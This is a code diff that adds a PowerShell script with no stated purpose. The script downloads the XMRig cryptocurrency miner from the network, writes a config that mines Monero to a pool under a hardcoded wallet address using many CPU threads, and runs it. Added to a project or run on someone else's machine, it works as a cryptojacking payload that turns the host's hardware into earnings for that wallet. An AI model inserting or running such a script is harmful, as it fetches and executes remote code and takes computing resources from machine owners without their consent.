@@ -1,0 +1,40 @@
+$xmrigDir = "$env:USERPROFILE\xmrig"
+$configFile = "$xmrigDir\config.json"
+
+if (-Not (Test-Path $xmrigDir)) {
+    New-Item -ItemType Directory -Path $xmrigDir
+}
+
+$xmrigZip = "$xmrigDir\xmrig.zip"
+Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/latest/download/xmrig-win64.zip" -OutFile $xmrigZip
+
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+[System.IO.Compression.ZipFile]::ExtractToDirectory($xmrigZip, $xmrigDir)
+
+$configJson = @"
+{
+  "autosave": true,
+  "cpu": {
+    "enabled": true,
+    "huge-pages": true,
+    "hw-aes": null,
+    "priority": null,
+    "asm": true,
+    "max-threads-hint": 16
+  },
+  "donate-level": 1,
+  "pools": [
+    {
+      "url": "pool.supportxmr.com:3333",
+      "user": "4AEvV5LUgniMCYeEJ9RFCYB6urJPqfsgTZCHCrCRbu1RMWxQ3yG6uRJCwngdS2Fi89atwmZyYPQqGP32wM3ASgbYQ8La2zC",
+      "pass": "Worker",
+      "keepalive": true,
+      "tls": false
+    }
+  ]
+}
+"@
+
+$configJson | Out-File -FilePath $configFile -Encoding UTF8
+
+Start-Process -FilePath "$xmrigDir\xmrig.exe" -ArgumentList "--config=$configFile" -NoNewWindow -Wait
